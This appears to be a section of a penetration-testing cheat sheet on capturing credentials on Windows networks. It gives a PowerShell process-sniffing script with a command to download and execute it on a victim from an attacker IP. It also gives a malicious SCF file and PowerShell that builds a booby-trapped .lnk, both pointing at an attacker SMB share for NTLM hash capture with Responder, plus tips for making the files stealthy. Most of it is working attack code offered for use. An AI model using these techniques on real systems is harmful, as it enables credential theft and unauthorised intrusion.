### Wireshark
If you are on a shared server and Wireshark is installed is worth testing to sniff for traffic. It SYSADMIN was lazy, it could be that he/she forgot to Restrict Traffic Sniff to Admins **ONLY**.
Which let's you sniff for traffic and you can ex find unecryted ex ftp or http.

### Process Monitor
Sniff for credentials in hidden processes ex invoked when we ask for a CMD shell.
1)Procmon.ps1
```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
2)Host it locally on attackers machine
3)Run on victim:
```
 IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```
 
### SCF Hash sniff
SCF aka Shell Command File is used by Windows Explorer to move folders ex, open Desktop etc. By editing the icon to point to a Samba Share UNC address we can ex sniff Hash with Responder or similar.
1)Prepare the malicious **@Inventory.scf** (Try to name it same as other file in same folder being stealth. File type recognized should be "File Explorer Command")
```
[Shell]
Command=2
IconFile=\\YOURIP\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
2)Place it on a share (@ will make sure it's shown at top)
3)Setup a listener on your machine (use these parameters otherwise won't work)
```
sudo responder --lm -v -I tun0
```

### Malicious .lnk 
(Works **ONLY** for version below Server 2019)
Reference: https://github.com/dievus/lnkbomb
1)If you use the tool in the reference it will do all the work for you: create the malicious **.lnk**, upload to a share, wait and sniff "Responder"
OR 
2)Do it manually with Powershell, create a **link.lnk**
```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
3) Upload to a SMB share
4)Setup Responder listening and wait!

**OR Easier:** https://github.com/Greenwolf/ntlm_theft